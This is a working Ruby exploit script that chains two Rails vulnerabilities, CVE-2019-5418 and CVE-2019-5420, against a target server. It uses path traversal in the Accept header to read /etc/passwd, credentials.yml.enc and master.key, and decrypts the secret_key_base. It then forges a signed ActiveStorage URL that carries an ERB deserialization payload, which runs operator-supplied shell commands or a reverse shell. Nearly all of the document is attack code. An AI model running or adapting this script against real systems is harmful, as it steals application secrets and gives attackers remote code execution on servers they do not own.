require 'erb'
require "./demo-5.2.1/config/environment"
require "base64"
require 'net/http'

$proxy_addr = '127.0.0.1'
$proxy_port = 8080

$remote = "http://172.18.0.3:3000"
$ressource = "/demo"

puts "\nRails exploit CVE-2019-5418 + CVE-2019-5420 = RCE\n\n"

print "[+] Checking if vulnerable to CVE-2019-5418 => "
uri = URI($remote + $ressource)
req = Net::HTTP::Get.new(uri)
req['Accept'] = "../../../../../../../../../../etc/passwd{{"
res = Net::HTTP.start(uri.hostname, uri.port, $proxy_addr, $proxy_port) {|http|
  http.request(req)
}
if res.body.include? "root:x:0:0:root:"
   puts "\033[92mOK\033[0m"
else
    puts "KO"
    abort
end

print "[+] Getting file => credentials.yml.enc => "
path = "../../../../../../../../../../config/credentials.yml.enc{{"
for $i in 0..9
    uri = URI($remote + $ressource)
    req = Net::HTTP::Get.new(uri)
    req['Accept'] = path[3..57]
    res = Net::HTTP.start(uri.hostname, uri.port, $proxy_addr, $proxy_port) {|http|
        http.request(req)
    }
    if res.code == "200"
        puts "\033[92mOK\033[0m"
        File.open("credentials.yml.enc", 'w') { |file| file.write(res.body) }
        break
    end
    path = path[3..57]
    $i +=1;
end

print "[+] Getting file => master.key => "
path = "../../../../../../../../../../config/master.key{{"
for $i in 0..9
    uri = URI($remote + $ressource)
    req = Net::HTTP::Get.new(uri)
    req['Accept'] = path[3..57]
    res = Net::HTTP.start(uri.hostname, uri.port, $proxy_addr, $proxy_port) {|http|
        http.request(req)
    }
    if res.code == "200"
        puts "\033[92mOK\033[0m"
        File.open("master.key", 'w') { |file| file.write(res.body) }
        break
    end
    path = path[3..57]
    $i +=1;
end

print "[+] Decrypt secret_key_base => "
credentials_config_path = File.join("../", "credentials.yml.enc")
credentials_key_path = File.join("../", "master.key")
ENV["RAILS_MASTER_KEY"] = res.body
credentials = ActiveSupport::EncryptedConfiguration.new(
    config_path: Rails.root.join(credentials_config_path),
    key_path: Rails.root.join(credentials_key_path),
    env_key: "RAILS_MASTER_KEY",
    raise_if_missing_key: true
)
if credentials.secret_key_base != nil
    puts "\033[92mOK\033[0m"
    puts ""
    puts "secret_key_base": credentials.secret_key_base
    puts ""
end

puts "[+] Getting reflective command (R) or reverse shell (S) => "
loop do 
    begin
        input = [(print 'Select option R or S: '), gets.rstrip][1]
        if input == "R"
            puts "Reflective command selected"
            command = [(print "command (\033[92mreflected\033[0m): "), gets.rstrip][1]
        elsif input == "S"
            puts "Reverse shell selected"
            command = [(print "command (\033[92mnot reflected\033[0m): "), gets.rstrip][1]
        else
            puts "No option selected"
            abort
        end

        command_b64 = Base64.encode64(command)

        print "[+] Generating payload CVE-2019-5420 => "
        secret_key_base = credentials.secret_key_base
        key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
        secret = key_generator.generate_key("ActiveStorage")
        verifier = ActiveSupport::MessageVerifier.new(secret)
        if input == "R"
            code = "system('bash','-c','" + command + " > /tmp/result.txt')"
        else
            code = "system('bash','-c','" + command + "')"
        end 
        erb = ERB.allocate
        erb.instance_variable_set :@src, code
        erb.instance_variable_set :@filename, "1"
        erb.instance_variable_set :@lineno, 1
        dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result

        puts "\033[92mOK\033[0m"
        puts ""
        url = $remote + "/rails/active_storage/disk/" + verifier.generate(dump_target, purpose: :blob_key) + "/test"
        puts url
        puts ""

        print "[+] Sending request => "
        uri = URI(url)
        req = Net::HTTP::Get.new(uri)
        req['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        res = Net::HTTP.start(uri.hostname, uri.port, $proxy_addr, $proxy_port) {|http|
        http.request(req)
        }
        if res.code == "500"
            puts "\033[92mOK\033[0m"
        else
            puts "KO"
            abort
        end

        if input == "R"
            print "[+] Getting result of command => "
            uri = URI($remote + $ressource)
            req = Net::HTTP::Get.new(uri)
            req['Accept'] = "../../../../../../../../../../tmp/result.txt{{"
            res = Net::HTTP.start(uri.hostname, uri.port, $proxy_addr, $proxy_port) {|http|
            http.request(req)
            }
            if res.code == "200"
                puts "\033[92mOK\033[0m\n\n"
                puts res.body
                puts "\n"
            else
                puts "KO"
                abort
            end
        end
        
    rescue Exception => e
        puts "Exiting..."
        abort
    end
end
